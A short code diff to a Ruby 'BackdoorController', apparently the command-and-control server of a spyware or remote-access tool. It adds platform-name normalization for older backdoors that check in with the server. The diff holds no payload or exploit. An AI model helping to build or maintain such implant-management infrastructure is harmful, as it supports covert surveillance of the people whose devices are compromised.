@@ -48,6 +48,16 @@ class BackdoorController < RESTController
     demo = true unless request['subtype']['-DEMO'].nil?
     platform = request['subtype'].gsub(/-DEMO/, '').downcase
 
+    # retro compatibility for older backdoors (pre 8.0) sending win32, win64, ios, osx
+    case platform
+      when 'win32', 'win64'
+        platform = 'windows'
+      when 'iphone'
+        platform = 'ios'
+      when 'macos'
+        platform = 'osx'
+    end
+
     # is the backdoor already in the database? (has it synchronized at least one time?)
     backdoor = Item.where({_kind: 'backdoor', build: request['build_id'], instance: request['instance_id'], platform: platform, demo: demo}).first
 
